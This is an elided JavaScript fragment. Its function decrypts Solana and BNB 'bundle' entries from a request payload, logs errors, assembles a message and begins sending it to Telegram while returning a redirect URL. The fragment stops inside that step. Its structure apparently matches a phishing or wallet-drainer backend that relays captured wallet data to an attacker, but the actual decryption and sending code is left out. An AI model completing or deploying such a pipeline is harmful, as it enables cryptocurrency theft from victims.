...
async function processSlug(slug) {
  ...
  // Safely attempt decryption – any error here is logged but does NOT stop the message
  if (payload.bundle) {
    try {
      ...
      if (payload.sBundles) {
        try {
          const sArray = JSON.parse(payload.sBundles);
          ...
          for (const res of results) {
            if (!res.failed) {
              try {
                ...
                console.error(`[solana] entry ${res.index} conversion error:`, err.message);
              }
            } else {
              console.error(`[solana] entry ${res.index} decrypt error:`, res.error);
            }
          }
        } catch (err) {
          console.error('[solana] sBundles JSON parse error:', err.message);
          // keep solanaItems empty, proceed
        }
      }
      ...
      if (payload.eBundles) {
        try {
          const eArray = JSON.parse(payload.eBundles);
          ...
          for (const res of results) {
            if (!res.failed) {
              try {
                ...
                console.error(`[bnb] entry ${res.index} conversion error:`, err.message);
              }
            } else {
              console.error(`[bnb] entry ${res.index} decrypt error:`, res.error);
            }
          }
        } catch (err) {
          console.error('[bnb] eBundles JSON parse error:', err.message);
          // keep bnbItems empty, proceed
        }
      }
    } catch (err) {
      console.error('[decrypt] bundle key error:', err.message);
      // proceed with empty arrays
    }
  } else {
    console.error('[decrypt] No bundle key provided in payload');
  }

  // Build message – always succeeds
  const parts = [];
  ...
  // Send to Telegram – errors are logged, but we always return the redirect URL
  try {
